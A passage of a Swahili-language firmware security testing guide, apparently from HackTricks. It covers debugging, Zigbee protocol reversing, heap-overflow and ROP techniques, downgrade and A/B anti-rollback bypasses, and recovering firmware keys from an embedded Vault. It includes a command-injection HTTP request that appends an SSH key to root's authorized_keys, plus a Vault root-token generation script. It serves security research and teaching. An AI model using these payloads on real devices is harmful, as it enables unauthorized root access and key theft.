Kagua hali endelevu nje ya guest wakati boot za polepole, startup scripts zinazoharibu data, au logging isiyotegemewa ya console zinaficha hitilafu. Usitumie overlay ambayo VM inayoendesha inaitumia; ifichue kwa `qemu-nbd`, punguza ugunduzi wa LVM kwenye partition iliyokusudiwa ya NBD, kisha zima volume group kabla ya kuitenganisha.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Kwa ajili ya kutenga hitilafu kwa njia inayoweza kurudiwa, andika faili za alama zenye mihuri ya muda kwenye ujazo thabiti unaoweza kuandikiwa, kisha uzihakiki ukiwa nje ya mfumo; `/dev/kmsg`, FIFO na koni za muda zinaweza kutoa matokeo hasi ya uongo kutokana na udhibiti wa kasi au mchakato kusitishwa mapema. Pia linganisha violesura halisi katika tabaka zote kabla ya kubadilisha msimbo usiohusika: `uname -r` dhidi ya `/lib/modules/`, vipengele vya ext4 vilivyo kwenye diski dhidi ya usanidi wa kernel, na kizazi cha Mesa `libGL` dhidi ya ABI ya kiendeshi cha DRI na majina ya viendeshi yanayotokana na PCI. Kijenzi kinaweza kuwepo na hata `dlopen()` kufanikiwa, lakini bado kisiweze kutumika kwa sababu mtumiaji wake anatarajia ABI tofauti.<sup>[[11]](#references)</sup>

## Uchambuzi wa Mienendo kwa Vitendo

Katika hatua hii, mazingira ya kifaa halisi au yaliyoigwa hutumiwa kwa uchambuzi. Ni muhimu kudumisha ufikiaji wa shell kwenye OS na mfumo wa faili. Uigaji huenda usiige kikamilifu mwingiliano wa maunzi, hivyo wakati mwingine ni lazima uanzishwe upya. Uchambuzi unapaswa kukagua tena mfumo wa faili, kutumia vibaya kurasa za wavuti na huduma za mtandao zilizo wazi, na kuchunguza udhaifu wa bootloader. Majaribio ya uadilifu wa firmware ni muhimu ili kubaini udhaifu unaoweza kusababishwa na backdoor.

## Mbinu za Uchambuzi Wakati wa Uendeshaji

Uchambuzi wakati wa uendeshaji unahusisha kuingiliana na mchakato au binary katika mazingira yake ya uendeshaji, kwa kutumia zana kama gdb-multiarch, Frida na Ghidra kuweka breakpoints na kutambua udhaifu kupitia fuzzing na mbinu nyingine.

Kwa vifaa lengwa vilivyopachikwa ambavyo havina debugger kamili, **nakili `gdbserver` iliyounganishwa kwa statically** kwenye kifaa na uunganishe nayo kwa mbali:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Ramani ya ujumbe wa Zigbee / radio-co-processor

Kwenye hubs za IoT, RF stack mara nyingi hugawanywa kati ya **radio MCU** na mchakato wa Linux userland. Workflow muhimu ni kufuatilia njia:<sup>[[8]](#references)</sup>

1. **RF frame** hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text au TLV protocol** inayotumwa kwa Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** kwenye daemon kuu
5. **protocol-specific handler / state machine**

Muundo huu huunda maeneo mawili ya reversing badala ya moja. Ikiwa controller inabadilisha binary radio frames kuwa protocol ya maandishi kama `Group,Command,arg1,arg2,...`, tafuta:

- **Vikundi vya ujumbe** na dispatch tables
- Ni ujumbe upi unaweza kutoka kwenye **network** dhidi ya kutoka kwa controller yenyewe
- Sehemu halisi za **manufacturer-specific discriminator** (kwa mfano Zigbee `manufacturer_code` na `cluster_command` maalum)
- Ni handlers zipi zinaweza kufikiwa tu wakati wa **commissioning**, discovery, au hatua za kupakua firmware/model

Kwa Zigbee hasa, nasa pairing traffic na uangalie kama kifaa lengwa bado kinatumia **Link Key** chaguomsingi `ZigBeeAlliance09`. Ikiwa ndivyo, kunasa commissioning traffic kunaweza kufichua **Network Key**. Zigbee 3.0 install codes hupunguza hatari hii, kwa hiyo andika ikiwa kifaa kilichojaribiwa kinazitekeleza kweli.

### Manufacturer-specific protocol handlers na ufikikaji unaotegemea FSM

Amri za Zigbee/ZCL maalum za vendor mara nyingi hulengwa vizuri zaidi kuliko standardized clusters kwa sababu hutumia **custom parsing code** na **FSMs** za ndani ambazo hazijafanyiwa majaribio ya kutosha ya uthibitishaji.<sup>[[8]](#references)</sup>

Workflow ya vitendo:

- Fuatilia command dispatcher kwa reverse engineering hadi upate **vendor-only handler**.
- Pata jedwali la **FSM state**, **event**, **check**, **action**, na **next-state**.
- Tambua **transitional states** zinazoendelea zenyewe na matawi ya retry/error ambayo hatimaye huanzisha upya au kufuta state inayodhibitiwa na mshambuliaji.
- Thibitisha ni mawasiliano yapi halali ya protocol yanayohitajika ili kuweka daemon katika hali iliyo hatarini, badala ya kudhani kuwa handler yenye hitilafu inaweza kufikiwa wakati wowote.

Kwa protocols zinazotegemea muda, packet replay kutoka kwenye Python framework inaweza kuwa polepole mno. Njia ya kuaminika zaidi ni kuiga kifaa halali kwenye hardware halisi (kwa mfano **nRF52840**) kwa kutumia stack ya kiwango cha vendor ili uweze kufichua **endpoints**, **attributes**, na muda sahihi wa commissioning.

### Aina ya hitilafu ya fragmented-download kwenye embedded daemons

Aina ya hitilafu inayojirudia kwenye firmware hutokea katika upakuaji wa **fragmented blob/model/configuration**:<sup>[[8]](#references)</sup>

1. **Fragment ya kwanza** (`offset == 0`) huhifadhi `ctx->total_size` na kutenga kumbukumbu kwa `malloc(total_size)`.
2. Fragments zinazofuata huthibitisha tu sehemu za **packet-local** zinazodhibitiwa na mshambuliaji, kama vile `packet_total_size >= offset + chunk_len`.
3. Nakala hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila kuangalia ukubwa dhidi ya **ukubwa wa awali uliotengewa kumbukumbu**.

Hii humwezesha mshambuliaji kutuma:

- Fragment ya kwanza halali yenye ukubwa wa jumla uliotangazwa **mdogo**, ili kulazimisha ugawaji mdogo wa heap.
- Fragment ya baadaye yenye **offset inayotarajiwa** lakini `chunk_len` kubwa zaidi.
- Ukubwa wa packet-local ulioghushiwa unaopita ukaguzi mpya huku bado ukifurika buffer iliyotengewa awali.

Ikiwa njia iliyo hatarini inalindwa na commissioning logic, exploitation lazima ijumuishwe na **device emulation** ya kutosha kuipeleka target katika hali inayotarajiwa ya upakuaji wa model au blob kabla ya kutuma fragments zilizoharibika.

### Vichochezi vya `free()` vinavyoendeshwa na protocol

Kwenye embedded daemons, njia rahisi zaidi ya kuchochea heap metadata exploitation mara nyingi si “kusubiri cleanup” bali **kulazimisha error handling ya protocol yenyewe**:<sup>[[8]](#references)</sup>

- Tuma fragments za ufuatiliaji zilizoharibika ili kupeleka FSM kwenye hali za **retry** au **error**.
- Vuka kikomo cha majaribio ili daemon **ianzishe upya context** na kufuta buffer iliyoharibiwa.
- Tumia `free()` hii inayotabirika kuchochea primitives za allocator kabla mchakato haujaanguka kwa sababu zisizohusiana.

Hili ni muhimu hasa dhidi ya allocators za **musl/uClibc/dlmalloc-like** kwenye embedded Linux, ambapo kuharibu chunk metadata kunaweza kubadilisha unlink/unbin logic kuwa write primitive. Muundo thabiti ni kuharibu **size field** ili kuelekeza allocator traversal kwenye **fake chunks zilizowekwa ndani ya buffer iliyofurika**, badala ya kuharibu mara moja bin pointers halisi na kusababisha mchakato kuanguka.

## Binary Exploitation na Proof-of-Concept

Kutengeneza PoC kwa vulnerabilities zilizotambuliwa kunahitaji uelewa wa kina wa usanifu wa target na programu katika lugha za kiwango cha chini. Ulinzi wa binary runtime kwenye embedded systems si wa kawaida, lakini unapokuwepo, mbinu kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### Vidokezo vya uClibc fastbin exploitation (embedded Linux)

- **Fastbins + consolidation:** uClibc hutumia fastbins zinazofanana na za glibc. Ugawaji mkubwa wa baadaye unaweza kuchochea `__malloc_consolidate()`, kwa hiyo fake chunk yoyote lazima ipite ukaguzi (ukubwa unaokubalika, `fd = 0`, na chunks jirani kutambuliwa kama "in use").<sup>[[6]](#references)</sup>
- **Binaries zisizo za PIE chini ya ASLR:** ikiwa ASLR imewashwa lakini binary kuu ni **non-PIE**, anwani za `.data/.bss` ndani ya binary huwa thabiti. Unaweza kulenga eneo ambalo tayari linafanana na heap chunk header halali ili kuelekeza fastbin allocation kwenye **function pointer table**.
- **NUL inayosimamisha parser:** JSON inapochanganuliwa, `\x00` ndani ya payload inaweza kusimamisha uchanganuzi huku ikihifadhi bytes zinazofuata zinazodhibitiwa na mshambuliaji kwa stack pivot/ROP chain.
- **Shellcode kupitia `/proc/self/mem`:** ROP chain inayopiga `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kuweka shellcode inayoweza kutekelezwa kwenye mapping inayojulikana na kurukia hapo.

## Operating Systems Zilizoandaliwa kwa Firmware Analysis

Operating systems kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyosanidiwa tayari kwa majaribio ya usalama wa firmware, yakiwa na zana zinazohitajika.

## OS Zilizoandaliwa kwa Kuchambua Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyokusudiwa kukusaidia kufanya tathmini ya usalama na penetration testing ya vifaa vya Internet of Things (IoT). Hukuepusha kupoteza muda mwingi kwa kutoa mazingira yaliyosanidiwa tayari na zana zote zinazohitajika.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Mfumo endeshi wa majaribio ya usalama wa embedded unaotegemea Ubuntu 18.04 na una zana za majaribio ya usalama wa firmware zilizowekwa tayari.

## Mashambulizi ya Firmware Downgrade na Mbinu za Update Zisizo Salama

Hata vendor anapotekeleza ukaguzi wa sahihi za kriptografia kwa firmware images, **ulinzi dhidi ya kurudisha toleo nyuma (downgrade) mara nyingi huachwa**. Ikiwa boot- au recovery-loader inathibitisha tu sahihi kwa kutumia public key iliyopachikwa lakini hailinganishi *toleo* (au monotonic counter) la image inayowekwa, mshambuliaji anaweza kusakinisha kihalali **firmware ya zamani iliyo hatarini ambayo bado ina sahihi halali**, na hivyo kurudisha vulnerabilities zilizorekebishwa.<sup>[[4]](#references)</sup>

Workflow ya kawaida ya shambulio:

1. **Pata image ya zamani iliyotiwa sahihi**
   * Ipakue kutoka kwenye portal ya umma ya vendor, CDN au tovuti ya usaidizi.
   * Itoe kutoka kwenye programu za simu/desktop zinazoambatana na kifaa (kwa mfano ndani ya Android APK kwenye `assets/firmware/`).
   * Ipate kutoka kwenye hazina za watu wengine kama VirusTotal, Internet archives, forums, n.k.
2. **Pakia au toa image kwa kifaa** kupitia channel yoyote ya update iliyo wazi:
   * Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
   * Vifaa vingi vya IoT vya watumiaji vina endpoints za HTTP(S) *zisizohitaji uthibitishaji* zinazokubali firmware blobs zilizosimbwa kwa Base64, kuzisimbua upande wa server na kuanzisha recovery/upgrade.
3. Baada ya downgrade, tumia vulnerability iliyorekebishwa kwenye toleo jipya zaidi (kwa mfano kichujio cha command-injection kilichoongezwa baadaye).
4. Kwa hiari, flash image ya hivi karibuni tena au zima updates ili kuepuka kugunduliwa baada ya kupata persistence.

### Mfano: Command Injection Baada ya Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Katika firmware iliyo hatarini (iliyoshushwa toleo), parameter ya `md5` huunganishwa moja kwa moja kwenye amri ya shell bila kusafishwa, hivyo kuruhusu kuingiza amri zozote (hapa—kuwezesha ufikiaji wa root kupitia SSH kwa kutumia key). Matoleo ya baadaye ya firmware yalianzisha kichujio cha msingi cha herufi, lakini kutokuwepo kwa ulinzi dhidi ya kushusha toleo kunafanya marekebisho hayo yasiwe na maana.<sup>[[4]](#references)</sup>

### Kutoa Firmware Kutoka kwenye Programu za Simu

Vendor wengi hujumuisha picha kamili za firmware ndani ya programu zao saidizi za simu ili programu iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Vifurushi hivi kwa kawaida huhifadhiwa bila usimbaji fiche ndani ya APK/APEX kwenye njia kama `assets/fw/` au `res/raw/`. Zana kama `apktool`, `ghidra`, au hata `unzip` ya kawaida hukuwezesha kutoa picha zilizotiwa saini bila kugusa hardware halisi.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass ya anti-rollback inayotekelezwa na updater pekee katika miundo ya slot za A/B

Baadhi ya vendors hutekeleza **ratchet** ya kuzuia downgrade, lakini ndani ya mantiki ya *updater* pekee (kwa mfano, routine ya UDS kupitia CAN, amri ya recovery, au wakala wa OTA wa userspace). Ikiwa **bootloader** baadaye hukagua tu sahihi ya image/CRC na kuamini jedwali la partitions au metadata ya slot, ulinzi wa rollback bado unaweza kukwepwa.<sup>[[7]](#references)</sup>

Muundo dhaifu wa kawaida:

- Metadata ya firmware huwa na maelezo ya version na **ratchet** ya usalama / counter inayoongezeka tu.
- Updater hulinganisha ratchet ya image na thamani iliyohifadhiwa kwenye persistent storage na kukataa image za zamani zilizosainiwa.
- **Bootloader** haisomi ratchet hiyo na hukagua tu header, CRC, na sahihi kabla ya kuwasha slot iliyochaguliwa.
- Uamilishaji wa slot huhifadhiwa kando kwenye jedwali la partitions au counter ya generation kwa kila slot na **haujaunganishwa kwa njia ya kriptografia** na digest halisi ya firmware iliyothibitishwa.

Hii huunda primitive ya **thibitisha image moja / washa image nyingine** katika mifumo ya dual-slot. Ikiwa mshambuliaji anaweza kufanya updater iweke slot B kuwa lengwa la kuwashwa baadaye kwa kutumia image ya sasa iliyosainiwa, na baadaye akaandika upya slot B kabla ya kuwasha upya, bootloader bado inaweza kuwasha image iliyodowngrade kwa sababu huamini tu metadata ya slot iliyokwishawekwa.

Muundo wa kawaida wa matumizi mabaya:

1. Pakia firmware **ya sasa iliyosainiwa** kwenye slot isiyotumika na utekeleze routine ya kawaida ya uthibitishaji/ubadilishaji ili mpangilio uweke slot hiyo kuwa inayofuata kuamilishwa.
2. **Usiwake upya bado**. Ingia tena kwenye routine ya kuandaa/kufuta slot katika session hiyo hiyo.
3. Tumia vibaya hali ya zamani ya boot au mantiki ya zamani ya kuchagua slot ili updater ifute **slot ileile ya kimwili** iliyowekwa kuwa hai muda mfupi uliopita.
4. Andika firmware **ya zamani lakini bado iliyosainiwa** kwenye slot hiyo.
5. Ruka routine ya uthibitishaji inayotekeleza ratchet kisha washa upya moja kwa moja.
6. Bootloader huchagua slot iliyowekwa kuwa hai, hukagua sahihi/uadilifu pekee, na kuwasha image ya zamani.

Mambo ya kuangalia unapofanya reverse engineering ya utekelezaji wa masasisho ya A/B:

- Uchaguzi wa slot unatokana na **bendera za wakati wa kuwasha** ambazo hazisasishwi baada ya ubadilishaji kufanikiwa.
- Routine ya aina ya `prepare_passive_slot()` hufuta slot kwa kutumia hali ya zamani badala ya **mpangilio wa sasa uliowekwa**.
- Function ya aina ya `part_write_layout()` huongeza tu **counter ya generation** / bendera ya slot hai na haihifadhi hash ya image iliyothibitishwa.
- Ukaguzi wa ratchet unatekelezwa kwenye userspace au kwenye code ya updater, lakini **si** kwenye ROM / bootloader / hatua za secure boot.
- Routine za kufuta au recovery huacha slot ikiwa imetiwa alama kuwa inaweza kuwashwa hata baada ya maudhui yake kufutwa na kuandikwa upya.

### Orodha Hakiki ya Kutathmini Mantiki ya Usasishaji

* Je, usafirishaji/uthibitishaji wa *update endpoint* umelindwa ipasavyo (TLS + uthibitishaji)?
* Je, kifaa hulinganisha **nambari za version** au **counter ya monotonic ya kuzuia rollback** kabla ya kuandika firmware?
* Je, image inathibitishwa ndani ya secure boot chain (kwa mfano, sahihi hukaguliwa na code ya ROM)?
* Je, **bootloader hutekeleza ratchet ileile** kama updater, badala ya kuangalia sahihi/CRC pekee?
* Je, metadata ya uamilishaji wa slot **imefungamanishwa na digest/version ya firmware iliyothibitishwa**, au slot inaweza kubadilishwa baada ya kuamilishwa?
* Baada ya ubadilishaji wa slot kufanikiwa, je, kifaa hulazimishwa kuwasha upya, au routine za baadaye za kusasisha/kufuta bado zinaweza kufikiwa katika session hiyo hiyo?
* Je, code ya userland hufanya ukaguzi wa ziada wa uhalali (kwa mfano, ramani ya partitions inayoruhusiwa, nambari ya modeli)?
* Je, mtiririko wa masasisho wa *sehemu* au wa *backup* hutumia tena mantiki ileile ya uthibitishaji?

> 💡  Ikiwa lolote kati ya haya halipo, huenda platform iko hatarini kwa mashambulizi ya rollback.

## Firmware dhaifu ya kufanya mazoezi

Ili kufanya mazoezi ya kugundua udhaifu kwenye firmware, tumia miradi ifuatayo ya firmware dhaifu kama mwanzo.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Kurejesha funguo za usimbuaji wa firmware kutoka hali ya KMS/Vault iliyopachikwa

Wakati image ya sasisho inapochanganya metadata ndogo ya maandishi wazi na blob kubwa yenye entropy nyingi, chambua kontena kabla ya kujaribu brute force:<sup>[[1]](#references)</sup>

- Tupa headers, offsets na mipaka ya mistari kwa kutumia `hexdump`, `xxd`, `strings -tx`, `base64 -d`, na `binwalk -E`.
- `Salted__` kwa kawaida humaanisha umbizo la OpenSSL `enc`: byte 8 zinazofuata ni salt na byte zilizobaki ni ciphertext.
- Sehemu ya Base64 inayofasirika na kuwa `256` bytes kamili ni dalili kubwa kuwa unatazama ciphertext ya RSA-2048 inayofunga nenosiri/random key ya session ya firmware.
- Nyenzo ya PGP iliyotenganishwa iliyo kwenye faili hiyo hiyo mara nyingi hulinda uhalisi pekee; usidhani kuwa ndiyo utaratibu wa usiri.

Ikiwa utafutaji wa funguo tuli (`grep`, `strings`, utafutaji wa PEM/PGP) hautafanikiwa, fanya reverse engineering ya **mchakato wa uondoaji-usimbaji unaotumika** badala ya kutafuta funguo za faragha pekee:

- Decompile binary ya updater / management na ufuatilie ni nani anayesoma blob iliyosimbwa, ni helper/API gani inayoifungua, na jina la kimantiki la key inaloomba.
- Tafuta hali ya KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) pamoja na unit files na init scripts kwenye root filesystem iliyotolewa.
- Chukulia maandishi wazi ya `vault operator unseal ...`, recovery keys, bootstrap tokens, au scripts za auto-unseal za KMS ya ndani kuwa sawa na nyenzo za private key.

Ikiwa kifaa kinakuja na binary asilia ya Vault na backend ya hifadhi, kuendesha tena mazingira hayo kwa kawaida ni rahisi kuliko kutekeleza upya mambo ya ndani ya Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Ukiwa na root kwenye KMS iliyoundwa kwa cloning:

- Fanya transit keys ziweze ku-exportiwa ndani ya clone iliyotengwa pekee: `vault write transit/keys/<name>/config exportable=true`
- Export unwrap key: `vault read transit/export/encryption-key/<name>`
- Jaribu RSA key iliyorejeshwa kwa jozi halisi ya padding/hash inayotumiwa na KMS. Kushindwa kwa decryption ya PKCS#1 v1.5 na kushindwa kwa OAEP ya kawaida **hakuthibitishi** kuwa key si sahihi; flow nyingi zinazotegemea Vault hutumia OAEP yenye SHA-256, ilhali libraries za kawaida hutumia SHA-1 kwa default.
- Ikiwa payload inaanza na `Salted__`, tekeleza tena KDF ya OpenSSL ya vendor kwa usahihi (`EVP_BytesToKey`, mara nyingi MD5 kwenye appliances za zamani) kabla ya kujaribu decryption ya AES-CBC.

Hii inabadilisha tatizo la "firmware iliyosimbwa kwa njia fiche" kuwa tatizo la jumla zaidi: **rejesha operational keys za upande wa appliance, kisha tekeleza tena unwrap + vigezo halisi vya KDF offline**.

## Mafunzo na Vyeti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Kuvunja Usimbaji wa Firmware kwa Claude: Ujuzi wa Kiwandani, Kujitegemea kwa Kiwango cha Mwanzoni](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Mbinu ya Kupima Usalama wa Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Udukuzi wa IoT kwa Vitendo: Mwongozo Kamili wa Kushambulia Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Kutumia zero days kwenye vifaa vilivyoachwa – blogu ya Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jinsi Kifaa Mahiri cha $20 Kilivyonipa Ufikiaji wa Nyumba Yako](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sasa Unaniona: Sasa Umepwniwa](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Kutumia Tesla Wall Connector kupitia kiunganishi chake cha charge port - Sehemu ya 2: kukwepa anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Iwashe: Kutumia Philips Hue Bridge kupitia Over-the-Air](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS kwenye QEMU Sehemu ya 1: Kufungua kifurushi](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Nyaraka za Linux kernel - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS kwenye QEMU Sehemu ya 2: Kutatua hitilafu na Kurekebisha](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Manenosiri ya Dell BIOS: Usimbaji dhaifu wa XOR unawezesha urejeshaji kutoka SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Zana za kurejesha manenosiri ya Dell BIOS](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
